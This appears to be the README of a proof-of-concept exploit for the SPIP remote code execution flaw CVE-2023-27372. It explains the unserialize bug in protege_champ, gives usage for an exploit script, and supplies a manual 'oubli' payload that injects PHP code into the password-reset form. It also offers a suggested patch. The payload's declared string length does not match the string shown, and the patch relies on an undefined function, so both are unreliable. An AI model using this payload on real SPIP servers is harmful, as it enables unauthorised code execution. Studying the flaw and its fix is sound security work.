## This PoC was wrote quickly, it's nothing special.

### This exploits the new CVE-2023-27372 SPIP RCE vulnerability.

### It's a deserilzation flaw which exploits the dangerous use of #ENV tag during the reset password feature (spip.php?page=spip_pass) within "/ecrire/balise/formulaire_.php" Specifically this line:

1. Syntax: python3 exploit.py -u http(s)://url.com

```php
function protege_champ($texte){

	if (is_array($texte))

		$texte = array_map('protege_champ',$texte);

	else {

		// ne pas corrompre une valeur serialize

		if (preg_match(",^[abis]:\d+[:;],", $texte) AND unserialize($texte)!=false)

			return $texte;

		$texte = entites_html($texte);

		$texte = str_replace("'","&#39;",$texte);

	}

	return $texte;

}
```

### The protege_champ function suffers from various flaws. The regular expression (RE) check used to validate the input is flawed and can be bypassed easily. The code calls the unserialize function without proper validation, allowing the execution of arbitrary code. Manual exploitation can be performed extremely easily. For example, if we wanted to execute phpinfo(); we can do:

```php
oubli=s:19:"<?phpinfo(); ?>";
```
### If the server returns the expected out, it's vulnerable. How can we patch? Fairly simply actually. Below, I have wrote a basic patch:

```php
function protege_champ($texte) {

  if (is_array($texte)) {

    $texte = array_map('protege_champ', $texte);

  } else {

    if (!isValidInput($texte)) {

      $texte = 'Malicious input detected';

    } else {

      $texte = entites_html($texte);

      $texte = str_replace("'", "&#39;", $texte);

    }

  }

  return $texte;

}
```
### The patched protege_champ function includes input validation, sanitization, and handling of malicious input. 

### Please do not use this for malicious use. Thank you. 

<a href=https://twitter.com/0SPwn>Twitter</a>
